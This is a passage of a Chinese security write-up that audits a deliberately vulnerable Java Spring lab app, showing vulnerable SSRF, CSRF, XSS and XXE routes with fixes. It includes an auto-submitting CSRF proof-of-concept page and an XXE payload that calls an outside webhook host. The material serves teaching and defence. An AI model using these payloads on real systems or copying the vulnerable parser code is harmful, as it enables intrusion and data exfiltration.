<p><code>httpClient</code>函数：</p>
<pre><code class="java">public static String httpClient(String url) &#123;

        StringBuilder result = new StringBuilder();

        try &#123;

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) &#123;
                result.append(line);
            &#125;

            return result.toString();

        &#125; catch (Exception e) &#123;
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<h5 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h5><pre><code class="java">@GetMapping(&quot;/commonsHttpClient/sec&quot;)
public String commonsHttpClient(@RequestParam String url) &#123;

    try &#123;
        SecurityUtil.startSSRFHook();
        return HttpUtils.commonHttpClient(url);
    &#125; catch (SSRFException | IOException e) &#123;
        return e.getMessage();
    &#125; finally &#123;
        SecurityUtil.stopSSRFHook();
    &#125;

&#125;
</code></pre>
<p><code>commonHttpClient</code>函数：</p>
<pre><code class="java">    public static String commonHttpClient(String url) &#123;

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try &#123;
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        &#125; catch (IOException e) &#123;
            return &quot;Error: &quot; + e.getMessage();
        &#125; finally &#123;
            // Release the connection.
            method.releaseConnection();
        &#125;
    &#125;
</code></pre>
<h5 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h5><pre><code class="java">    @GetMapping(&quot;/Jsoup/sec&quot;)
    public String Jsoup(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p><code>Jsoup</code>函数：</p>
<pre><code class="java">   public static String Jsoup(String url) &#123;
        try &#123;
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie(&quot;name&quot;, &quot;joychou&quot;) // request cookies
                    .execute().parse();
            return doc.outerHtml();
        &#125; catch (IOException e) &#123;
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<h5 id="方法5："><a href="#方法5：" class="headerlink" title="方法5："></a>方法5：</h5><pre><code class="java">  @GetMapping(&quot;/IOUtils/sec&quot;)
    public String IOUtils(String url) &#123;
        try &#123;
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

        return &quot;IOUtils ssrf test&quot;;
    &#125;
</code></pre>
<p><code>IOUtils</code>函数：</p>
<pre><code class="java">  public static void IOUtils(String url) &#123;
        try &#123;
            IOUtils.toByteArray(URI.create(url));
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
        &#125;
    &#125;
</code></pre>
<p> <strong>对比 OkHttp、HttpClient、CommonHttpClient、Jsoup 和 IOUtils</strong></p>
<p>这五种库各自有不同的特点，适用于不同的场景。下面从几个关键维度（如功能、灵活性、复杂性、性能、适用场景等）对它们进行比较。</p>
<table>
<thead>
<tr>
<th>库名称</th>
<th>功能概述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>一个现代化、功能丰富且高性能的 HTTP 客户端库，支持同步与异步请求、连接池、超时控制、自动重定向、WebSocket 支持等。</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>Apache HttpComponents 提供的 HTTP 客户端，功能丰富，支持连接管理、重定向、认证、代理等。适用于复杂的 HTTP 请求场景。</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>较旧版本的 Apache HTTP Client（HttpClient 3.x 系列），虽然功能较强，但已经被废弃，主要是为了向下兼容一些老系统。</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>主要用于解析和操作 HTML 文档，同时提供 HTTP 请求功能，适用于 Web 抓取、解析和处理网页数据，不专注于纯粹的 HTTP 通信。</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>Apache Commons IO 提供的工具类库，专注于流处理，提供简单的 API 来读取、写入和转换流，<code>toByteArray</code> 只是从 URL 读取数据的一种方式，较简单的 HTTP 请求方式。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>库名称</th>
<th>灵活性与配置</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>高度可配置，支持请求超时、拦截器、缓存控制、连接池、异步请求、重定向管理等功能，适合需要灵活 HTTP 请求的场景。</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>提供复杂的 HTTP 配置，包括连接池、代理设置、认证、连接超时、请求超时、重定向策略等，适合大规模、复杂的 HTTP 通信场景。</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>提供类似的功能，但由于是过时的版本，缺乏现代 HTTP 客户端的一些性能和灵活性优化。</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>主要功能在于解析 HTML 文档，它的 HTTP 请求配置选项较少，支持超时、重定向控制、Cookie、User-Agent 等少量配置，专注于网页抓取和 HTML 处理。</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>IOUtils 只是简单地将资源转换为字节流，几乎没有 HTTP 请求的配置选项，适合读取小型资源，不适合复杂的 HTTP 通信，无法配置代理、重定向等高级功能。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>库名称</th>
<th>复杂性</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>复杂度适中，提供直观的 API，适合需要灵活 HTTP 请求且对性能有要求的应用程序。</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>功能强大，但相对复杂，适合需要精细控制 HTTP 请求行为的场景。</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>与 HttpClient 类似，但较旧，API 较复杂，不建议在新项目中使用。</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>非常简单易用，尤其在网页抓取和 HTML 解析方面；但对于复杂的 HTTP 通信场景并不适用。</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>简单且功能有限，适用于简单的数据读取操作，代码简洁，但不支持复杂的 HTTP 请求场景</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>库名称</th>
<th>性能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>性能非常好，支持连接池、缓存等优化措施，在高并发场景下表现优异。</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>性能不错，提供了复杂场景下的优化策略，适合高负载的应用程序，但相对于 OkHttp 来说稍重。</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>性能较弱，缺乏现代 HTTP 客户端的一些优化（如连接池管理），由于 API 已过时，性能不如 OkHttp 和 HttpClient。</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>在处理 HTML 文档方面性能不错，但在 HTTP 请求方面不如 OkHttp 或 HttpClient 高效。</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>性能较低，因为它不提供连接池和高级 HTTP 优化机制，只适合小型资源的读取，在大数据或高频请求场景中表现不佳。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>库名称</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>适用于大多数 HTTP 通信场景，包括同步和异步请求、API 调用、RESTful 服务、WebSocket 通信等，特别适合需要高性能和灵活性的场景。</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>适用于复杂的 HTTP 通信场景，尤其是需要代理、身份认证、重定向管理等高级功能的项目。</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>主要用于老旧项目的兼容，或老系统中遗留的代码库，已经被弃用，不建议在新项目中使用。</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>适合 Web 爬虫和 HTML 解析任务，能够方便地处理和操作 HTML 页面，主要用于抓取网页并从中提取数据，不适合复杂 HTTP 请求配置的场景。</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>适用于简单的数据读取场景，如从 URL 读取小型文件、图像等，适合轻量级任务，但不适合频繁请求或复杂的 HTTP 请求场景。</td>
</tr>
</tbody></table>
<p><strong>总结</strong></p>
<ul>
<li><strong>OkHttp</strong> 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。</li>
<li><strong>HttpClient</strong> 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。</li>
<li><strong>CommonHttpClient</strong> 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。</li>
<li><strong>Jsoup</strong> 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。</li>
<li><strong>IOUtils</strong> 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。</li>
</ul>
<h4 id="（4）核心SSRF防护代码"><a href="#（4）核心SSRF防护代码" class="headerlink" title="（4）核心SSRF防护代码"></a>（4）核心SSRF防护代码</h4><p>修复代码：</p>
<pre><code class="java">public class SocketHook &#123;

    public static void startHook() throws IOException &#123;
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try&#123;
            Socket.setSocketImplFactory(new SocketHookFactory());
        &#125;catch (SocketException ignored)&#123;
        &#125;
    &#125;

    public static void stopHook()&#123;
        SocketHookFactory.setHook(false);
    &#125;
&#125;
</code></pre>
<p><strong>功能分析</strong>：</p>
<ul>
<li><strong><code>startHook()</code></strong>:<ul>
<li>启动 <code>SocketHook</code>，对所有新创建的 <code>Socket</code> 应用自定义行为。核心是通过 <code>Socket.setSocketImplFactory()</code> 来设置一个新的 <code>Socket</code> 工厂。</li>
<li>可能用于在 <code>Socket</code> 连接期间监控、修改、或审查数据流量。</li>
</ul>
</li>
<li><strong><code>stopHook()</code></strong>:<ul>
<li>关闭 <code>SocketHook</code>，将 <code>SocketHookFactory</code> 中的钩子状态关闭，停止对新 <code>Socket</code> 实例的自定义行为。</li>
</ul>
</li>
</ul>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>安全防护</strong>：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。</li>
<li><strong>网络审计</strong>：可用于监控网络流量，以记录或分析 <code>Socket</code> 通信内容。</li>
<li><strong>调试&#x2F;测试</strong>：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。</li>
</ul>
<h2 id="五、CSRF"><a href="#五、CSRF" class="headerlink" title="五、CSRF"></a>五、CSRF</h2><p> <strong>CSRF 攻击原理</strong></p>
<p>CSRF 的核心是利用用户的身份认证会话。例如，用户在登录某个网站后，拥有一个有效的会话 Cookie，这个 Cookie 允许用户在不重新登录的情况下执行后续操作。攻击者通过诱导用户访问恶意网站，自动向受信任网站发送合法的请求（携带了用户的会话 Cookie），从而让服务器认为是合法用户发起的操作。</p>
<p><strong>攻击流程：</strong></p>
<ol>
<li>用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。</li>
<li>攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。</li>
<li>用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。</li>
<li>受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求。</li>
</ol>
<h3 id="1-路由-x2F-csrf-x2F-post"><a href="#1-路由-x2F-csrf-x2F-post" class="headerlink" title="1.路由&#x2F;csrf&#x2F;post"></a>1.路由&#x2F;csrf&#x2F;post</h3><p>漏洞代码：</p>
<pre><code class="Java">@Controller
@RequestMapping(&quot;/csrf&quot;)
public class CSRF &#123;

    @GetMapping(&quot;/&quot;)
    public String index() &#123;
        return &quot;form&quot;;
    &#125;

    @PostMapping(&quot;/post&quot;)
    @ResponseBody
    public String post() &#123;
        return &quot;CSRF passed.&quot;;
    &#125;
&#125;
</code></pre>
<p>对应前端代码：</p>
<pre><code class="html">
&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;
&lt;/head&gt;



&lt;body&gt;


&lt;div&gt;
    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;
    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;
    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;
    &lt;/form&gt;
&lt;/div&gt;


&lt;/body&gt;




&lt;/html&gt;
</code></pre>
<p>该代码存在csrf漏洞，漏洞验证poc：</p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;CSRF Exploit&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;

    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;
    &lt;/form&gt;

    &lt;script&gt;
        // 自动提交表单，执行攻击
        document.getElementById(&#39;csrfForm&#39;).submit();
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>访问该页面，会自动调用该路由实现CSRF攻击。</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104016372.png" alt="image-20241008104016372"></p>
<h3 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h3><p><strong>使用CSRF Token</strong>：</p>
<ul>
<li>服务器生成一个唯一的CSRF Token并将其发送给用户（通常通过隐藏字段、URL参数或HTTP头）。</li>
<li>在提交表单或发起请求时，客户端将该Token一同发送回服务器，服务器验证Token的有效性以防止伪造请求。</li>
</ul>
<p><strong>SameSite Cookie 属性</strong>：</p>
<ul>
<li>设置Cookie的<code>SameSite</code>属性为<code>Strict</code>或<code>Lax</code>，限制第三方网站通过跨站点方式发送Cookie。</li>
<li><code>Strict</code>：禁止任何跨站请求携带Cookie。</li>
<li><code>Lax</code>：允许一些安全的跨站请求（例如GET请求），但阻止POST等敏感操作。</li>
</ul>
<p><strong>双重Cookie验证</strong>：</p>
<ul>
<li>服务器发送一个Cookie给用户，客户端在请求时会自动携带该Cookie。</li>
<li>客户端还需要在表单中携带相同的值（通过JS从Cookie中提取），服务器检查这两个值是否匹配。</li>
</ul>
<p><strong>检查Referer头</strong>：</p>
<ul>
<li>服务器通过验证请求头中的<code>Referer</code>字段是否来自合法的域名，来确定请求是否来自可信来源。</li>
<li>这种方法并不完全可靠，因为有些环境下<code>Referer</code>头可能会被修改或省略。</li>
</ul>
<p><strong>CAPTCHA</strong>：</p>
<ul>
<li>使用CAPTCHA来确保请求是由真实用户而非自动化脚本发起，虽然这种方式不能完全防护CSRF，但能增加攻击难度。</li>
</ul>
<p><strong>限制请求来源</strong>：</p>
<ul>
<li>对敏感操作（如资金转移、修改账户信息等）设置请求来源的严格验证，确保这些操作只能通过特定的合法来源进行。</li>
</ul>
<h2 id="六、XSS"><a href="#六、XSS" class="headerlink" title="六、XSS"></a>六、XSS</h2><h3 id="1-路由-x2F-xss-x2F-reflect"><a href="#1-路由-x2F-xss-x2F-reflect" class="headerlink" title="1.路由&#x2F;xss&#x2F;reflect"></a>1.路由&#x2F;xss&#x2F;reflect</h3><p>漏洞代码：</p>
<pre><code class="Java"> @RequestMapping(&quot;/reflect&quot;)
    @ResponseBody
    public static String reflect(String xss) &#123;
        return xss;
    &#125;
</code></pre>
<p>存在反射型xss，验证漏洞：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104436572.png" alt="image-20241008104436572"></p>
<h3 id="2-路由-x2F-xss-x2F-stored"><a href="#2-路由-x2F-xss-x2F-stored" class="headerlink" title="2.路由&#x2F;xss&#x2F;stored"></a>2.路由&#x2F;xss&#x2F;stored</h3><p>漏洞代码：</p>
<pre><code class="Java"> @RequestMapping(&quot;/stored/store&quot;)
    @ResponseBody
    public String store(String xss, HttpServletResponse response) &#123;
        Cookie cookie = new Cookie(&quot;xss&quot;, xss);
        response.addCookie(cookie);
        return &quot;Set param into cookie&quot;;
    &#125;

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping(&quot;/stored/show&quot;)
    @ResponseBody
    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;
        return xss;
    &#125;
</code></pre>
<p>存在存储型xss，漏洞验证：</p>
<p>先利用路由<code>/xss/stored/store</code>将恶意代码存到cookie中</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104751040.png" alt="image-20241008104751040"></p>
<p>再访问<code>/xss/stored/show</code>路由实现攻击：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104854995.png" alt="image-20241008104854995"></p>
<h3 id="XSS攻击防护"><a href="#XSS攻击防护" class="headerlink" title="XSS攻击防护"></a>XSS攻击防护</h3><p>防护代码：</p>
<pre><code>    @RequestMapping(&quot;/safe&quot;)
    @ResponseBody
    public static String safe(String xss) &#123;
        return encode(xss);
    &#125;

    private static String encode(String origin) &#123;
        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);
        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);
        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);
        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);
        origin = StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);
        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);
        return origin;
    &#125;
&#125;
</code></pre>
<p>对一些可能会被利用的关键字进行替换成安全的编码</p>
<h2 id="七、XXE"><a href="#七、XXE" class="headerlink" title="七、XXE"></a>七、XXE</h2><h3 id="1-路由-x2F-xxe-x2F-xmlReader-x2F-vuln"><a href="#1-路由-x2F-xxe-x2F-xmlReader-x2F-vuln" class="headerlink" title="1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="Java">@PostMapping(&quot;/xmlReader/vuln&quot;)
    public String xmlReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return &quot;xmlReader xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="2-路由-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><a href="#2-路由-x2F-xxe-x2F-SAXBuilder-x2F-vuln" class="headerlink" title="2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h3><pre><code class="java">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return &quot;SAXBuilder xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<p>换用SAXReader第三方库，攻击手法同上：</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
</code></pre>
<p>POST发送:</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110604490.png" alt="image-20241008110604490"></p>
<p>接收到dnslog：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110623158.png" alt="image-20241008110623158"></p>
<p><strong>修复代码</strong></p>
<p>原理同上，禁用了外部实体：</p>
<pre><code class="Java">    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)
    public String SAXBuilderSec(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;SAXBuilder xxe security code&quot;;
    &#125;
</code></pre>
<h3 id="3-路由-x2F-xxe-x2F-SAXReader-x2F-vuln"><a href="#3-路由-x2F-xxe-x2F-SAXReader-x2F-vuln" class="headerlink" title="3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="Java">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;SAXReader xxe vuln code&quot;;
    &#125;
</code></pre>
<p>跟上面的区别是该类有回显，payload不变</p>
<h3 id="4-路由-x2F-xxe-x2F-SAXParser-x2F-vuln"><a href="#4-路由-x2F-xxe-x2F-SAXParser-x2F-vuln" class="headerlink" title="4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return &quot;SAXParser xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="5-路由-x2F-xxe-x2F-Digester-x2F-vuln"><a href="#5-路由-x2F-xxe-x2F-Digester-x2F-vuln" class="headerlink" title="5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
        return &quot;Digester xxe vuln code&quot;;
    &#125;
</code></pre>
<h3 id="6-路由-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><a href="#6-路由-x2F-xxe-x2F-DocumentBuilder-x2F-vuln" class="headerlink" title="6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) &#123;
        try &#123;
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j &lt; child.getLength(); j++) &#123;
                    Node node = child.item(j);
                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
                &#125;
            &#125;
            return buf.toString();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        &#125;
    &#125;
</code></pre>
<p>这是JDK自带的类，以此产生的XXE是存在回显的</p>
<h3 id="7-路由-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><a href="#7-路由-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln" class="headerlink" title="7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="Java">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="8-路由-x2F-xxe-x2F-XMLReader-x2F-vuln"><a href="#8-路由-x2F-xxe-x2F-XMLReader-x2F-vuln" class="headerlink" title="8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@PostMapping(&quot;/XMLReader/vuln&quot;)
    public String XMLReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;XMLReader xxe vuln code&quot;;
    &#125;
</code></pre>
<h3 id="9-路由-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><a href="#9-路由-x2F-xxe-x2F-DocumentHelper-x2F-vuln" class="headerlink" title="9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
    public String DocumentHelper(HttpServletRequest req) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;DocumentHelper xxe vuln code&quot;;
    &#125;


    private static void response(NodeList rootNodeList)&#123;
        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
            &#125;

        &#125;
    &#125;
</code></pre>
